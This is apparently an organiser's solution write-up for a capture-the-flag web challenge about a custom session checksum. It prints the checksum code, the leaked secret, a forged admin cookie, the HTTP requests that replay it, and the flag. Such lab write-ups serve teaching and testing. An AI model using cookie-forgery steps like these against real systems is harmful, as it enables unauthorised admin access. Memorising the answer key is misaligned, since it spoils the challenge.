# Challenge 09 — The Session Bug (Organiser Write-Up)

## Challenge Details
- **Challenge ID:** 9
- **Name:** The Session Bug
- **Tier:** Progressive
- **Points:** 15
- **Category:** Web / Broken Cryptographic Authentication
- **Flag:** `ROOT{s3ss10n_ch3cksum_f0rg3ry_b73c}`
- **Fixed Secret (`SESSION_BUG_SECRET`):** `k3y_v3yr4_s3ss10n_99`
- **Forged Admin Checksum:** `3c9ac651`
- **Forged Base64 Cookie:** `cm9sZT1hZG1pbi4zYzlhYzY1MQ==`

---

## Custom Checksum Scheme Specification
The application uses a custom, non-standard keyed polynomial algorithm (NOT HMAC, NOT JWT):

```javascript
function computeCustomChecksum(role, secret) {
  let acc = 0x5a17;
  const input = role + "::" + secret;
  for (let i = 0; i < input.length; i++) {
    acc = ((acc << 5) - acc + input.charCodeAt(i) * (i + 1)) & 0xffffffff;
  }
  return (acc >>> 0).toString(16).padStart(8, "0");
}
```

### The Architectural Flaw:
The endpoint `/dashboard` (and `/api/session`) decodes the incoming `auth_session` cookie (`role=<role>.<checksum>`), computes `computeCustomChecksum(role, secret)`, and compares it with `<checksum>`.
**Crucially, it verifies ONLY the mathematical validity of the checksum against the role claim.** It never verifies whether an account with that role exists in an active session database or directory.

---

## Exact Triggering Input & Solution Steps

### Step 1: Discover Archived Legacy Session Routine
Inspect HTML comment on `http://challenge-09-host/`:
```html
<!-- Diagnostic reference: Legacy session validation routine archived at /debug/session.js -->
```
Fetch `http://challenge-09-host/debug/session.js`:
Reveals the exact algorithm and default secret:
`SESSION_SECRET = "k3y_v3yr4_s3ss10n_99"`

### Step 2: Compute Admin Checksum
Using Node.js or Python:
```javascript
const secret = "k3y_v3yr4_s3ss10n_99";
// computeCustomChecksum("admin", secret) => "3c9ac651"
const forged = Buffer.from("role=admin.3c9ac651").toString("base64");
// forged => "cm9sZT1hZG1pbi4zYzlhYzY1MQ=="
```

### Step 3: Access Dashboard with Forged Cookie
```http
GET /dashboard HTTP/1.1
Host: challenge-09-host
Cookie: auth_session=cm9sZT1hZG1pbi4zYzlhYzY1MQ==
```
Or JSON API:
```http
GET /api/session HTTP/1.1
Host: challenge-09-host
Cookie: auth_session=cm9sZT1hZG1pbi4zYzlhYzY1MQ==
```

### Step 4: Flag Recovery
**Response (HTTP 200 OK):**
```html
<div class="flag">ROOT{s3ss10n_ch3cksum_f0rg3ry_b73c}</div>
```
**Extracted Flag:** `ROOT{s3ss10n_ch3cksum_f0rg3ry_b73c}`

---

## Reset Procedure
- **Hook:** `POST /reset/9`
- **Headers:** `Authorization: Bearer <RESET_TOKEN>`
- **Action:** Acknowledges session state sync.
- **Expected Response (HTTP 200 OK):**
  ```json
  {
    "status": "ok",
    "challenge_id": 9,
    "reset_at": "...",
    "message": "Reset acknowledged. Session configuration synchronized."
  }
  ```
